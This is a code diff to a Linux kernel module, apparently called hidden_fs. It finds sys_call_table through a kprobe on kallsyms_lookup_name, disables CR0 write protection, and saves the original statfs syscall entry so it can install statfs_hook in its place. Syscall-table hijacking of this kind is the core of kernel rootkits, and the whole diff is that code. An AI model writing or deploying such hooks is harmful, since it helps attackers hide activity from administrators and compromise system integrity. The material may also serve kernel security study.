@@ -6,10 +6,16 @@
 #include <asm/uaccess.h>
 #include <linux/sched.h>
 #include <linux/kallsyms.h>
+#include <linux/kprobes.h>
+#include <linux/fs.h>
 
 MODULE_LICENSE("GPL");
 
 unsigned long *sys_call_table = 0;			/*系统调用表的指针*/
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);		/* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
+kallsyms_lookup_name_t kallsyms_lookup_name;		/*kallsyms_lookup_name_t函数指针*/
+
 /*
 设置cr0寄存器的第16位为0，并把原始的cr0寄存器的值返回
 */
@@ -37,11 +43,14 @@ void setback_cr0(unsigned int val)
 	asm volatile ("movq %%rax, %%cr0" :: "a"(val));
 }
 
-typedef long (*statfs_t)(const char * path,struct statfs *buf);
+typedef long (*statfs_t)(const char * pathname,struct statfs *buf);
 statfs_t orig_statfs;
 
-asmlinkage long statfs_hook(const char * path,struct statfs *buf)
+asmlinkage long statfs_hook(const char * pathname,struct statfs *buf)
 {
+	typedef int (*do_statfs_native_t)(struct kstatfs *st, struct statfs *p);
+	do_statfs_native_t do_statfs_native=kallsyms_lookup_name("do_statfs_native");
+
 	struct kstatfs st;
 	int error = user_statfs(pathname, &st);
 	if (!error)
@@ -50,20 +59,14 @@ asmlinkage long statfs_hook(const char * path,struct statfs *buf)
 	return error;
 }
 
+
+/*
+获取kallsyms_lookup_name函数指针
+*/
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
-
-/*
-先找到kallsyms_look_up函数，然后再通过这个函数找到sys_call_table的虚拟地址
-这个函数即使在kallsyms_look_up符号没有被导出的情况下也是可以运行的
-（具体机制暂且不清楚）
-*/
-static unsigned long * get_syscall_table(void) {
-  	/* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
- 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-	kallsyms_lookup_name_t kallsyms_lookup_name;
-
+static void get_kallsyms_lookup_name(void) {
   	/* register the kprobe */
   	register_kprobe(&kp);
 
@@ -72,7 +75,6 @@ static unsigned long * get_syscall_table(void) {
     
   	/* done with the kprobe, so unregister it */
   	unregister_kprobe(&kp);
-  	return (unsigned long *) kallsyms_lookup_name("sys_call_table");
 }
 
 /*模块的初始化函数，模块的入口函数，加载模块*/
@@ -80,7 +82,8 @@ static int __init init_hidden_fs(void)
 {
 	int orig_cr0;		/*原始cr0寄存器的值*/
 	printk("My syscall is starting。。。\n");
-	sys_call_table=get_syscall_table();			/* 获取系统调用服务首地址 */
+	get_kallsyms_lookup_name();
+	sys_call_table=(unsigned long *) kallsyms_lookup_name("sys_call_table");			/* 获取系统调用服务首地址 */
    	printk("sys_call_table: 0x%p\n", sys_call_table);
 	orig_statfs=(statfs_t)(sys_call_table[__NR_statfs]);		/* 保存原始系统调用 */
 	orig_cr0 = set_cr0_16_0();	/* 设置cr0可更改 */
